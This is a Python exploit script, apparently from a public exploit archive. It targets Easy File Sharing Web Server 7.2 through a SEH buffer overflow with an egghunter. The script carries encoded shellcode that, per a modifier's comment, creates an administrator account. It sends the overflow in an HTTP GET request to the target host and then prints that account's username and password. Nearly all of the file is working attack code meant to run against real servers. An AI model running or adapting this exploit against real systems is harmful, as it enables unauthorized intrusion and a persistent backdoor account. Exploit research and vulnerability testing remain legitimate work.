#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server 7.2 SEH Overflow with Egghunter
# Date: July 29, 2016
# Exploit Author: ch3rn0byl
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/download.php
# Version: 7.2
# Tested on: Windows 7, 8, 8.1, 10
# Admin privileges anyone?? hehe ;)
#
# Note: I modified the payload and a couple of other strings to make this exploit add an admin user.
# The original author, above, deserves all the credit for this tool
# jmm 12/01/2018
# 
from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from struct import pack
from time import sleep
from subprocess import call

host = argv[1]

rekt =  ""
rekt += "\x6a\x46\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
rekt += "\xbc\x9f\x04\x09\x83\xeb\xfc\xe2\xf4\x40\x77\x86\x09"
rekt += "\xbc\x9f\x64\x80\x59\xae\xc4\x6d\x37\xcf\x34\x82\xee"
rekt += "\x93\x8f\x5b\xa8\x14\x76\x21\xb3\x28\x4e\x2f\x8d\x60"
rekt += "\xa8\x35\xdd\xe3\x06\x25\x9c\x5e\xcb\x04\xbd\x58\xe6"
rekt += "\xfb\xee\xc8\x8f\x5b\xac\x14\x4e\x35\x37\xd3\x15\x71"
rekt += "\x5f\xd7\x05\xd8\xed\x14\x5d\x29\xbd\x4c\x8f\x40\xa4"
rekt += "\x7c\x3e\x40\x37\xab\x8f\x08\x6a\xae\xfb\xa5\x7d\x50"
rekt += "\x09\x08\x7b\xa7\xe4\x7c\x4a\x9c\x79\xf1\x87\xe2\x20"
rekt += "\x7c\x58\xc7\x8f\x51\x98\x9e\xd7\x6f\x37\x93\x4f\x82"
rekt += "\xe4\x83\x05\xda\x37\x9b\x8f\x08\x6c\x16\x40\x2d\x98"
rekt += "\xc4\x5f\x68\xe5\xc5\x55\xf6\x5c\xc0\x5b\x53\x37\x8d"
rekt += "\xef\x84\xe1\xf5\x05\x84\x39\x2d\x04\x09\xbc\xcf\x6c"
rekt += "\x38\x37\xf0\x83\xf6\x69\x24\xf4\xbc\x1e\xc9\x6c\xaf"
rekt += "\x29\x22\x99\xf6\x69\xa3\x02\x75\xb6\x1f\xff\xe9\xc9"
rekt += "\x9a\xbf\x4e\xaf\xed\x6b\x63\xbc\xcc\xfb\xdc\xdf\xf2"
rekt += "\x60\x27\xd9\xe7\x61\x29\x93\xfc\x24\x67\xd9\xeb\x24"
rekt += "\x7c\xcf\xfa\x76\x29\xd9\xf8\x63\x61\xc9\xf1\x70\x6c"
rekt += "\xce\xbf\x37\x6e\xdb\xd7\x71\x67\xc8\xfa\x76\x28\x9c"
rekt += "\xb0\x45\x4d\xf8\xbf\x22\x2f\x9c\xf1\x61\x7d\x9c\xf3"
rekt += "\x6b\x6a\xdd\xf3\x63\x7b\xd3\xea\x74\x29\xfd\xfb\x69"
rekt += "\x60\xd2\xf6\x77\x7d\xce\xfe\x70\x66\xce\xec\x24\x6c"
rekt += "\xdb\xf8\x6c\x7c\xd2\xeb\x61\x7b\x9c\xb0\x45\x4d\xf8"
rekt += "\x9f\x04\x09"

# Our tag is hive: \x68\x69\x76\x65

egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
egghunter += '\x05\x5a\x74\xef\xb8\x68\x69\x76\x65\x8b\xfa\xaf\x75'
egghunter += '\xea\xaf\x75\xe7\xff\xe7'

crash = "A" * 4061
crash += pack('<L', 0x909006eb)
crash += pack('<L', 0x10019ce3)
crash += egghunter
crash += "D" * (5500 - 4061 - 8 - len(egghunter))

payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)
payload += 'hivehive'
payload += rekt
payload += 'E' * (800 - len(rekt))

print '[+] Trying to exploit {}...'.format(host)

try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, 80))
        print '[+] Sending payload...'
        s.send(payload)
        s.close()
        print '[+] Trying to connect to target...\n'
        try:
                sleep(2)
                #call(['ncat', host, '54321'])
        except:
                print '[!] Whoops!! Something went wrong?'
except:
        print '[!] Whoops!! Something went wrong?'
finally:
        print '\n[+] login to argv[1] User=egghunter Pass=3ggHunter!'
